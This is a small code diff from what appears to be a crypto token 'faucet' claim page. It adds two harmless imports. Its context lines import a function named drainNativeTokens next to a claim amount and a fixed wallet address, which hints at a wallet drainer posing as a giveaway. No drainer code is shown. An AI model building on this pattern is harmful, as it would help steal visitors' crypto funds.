@@ -18,6 +18,8 @@ import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
+import { Link } from 'react-router-dom';
+import apepeImage from '@/assets/apepe.jpg';
 
 const CLAIM_AMOUNT = 0.1;
 const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
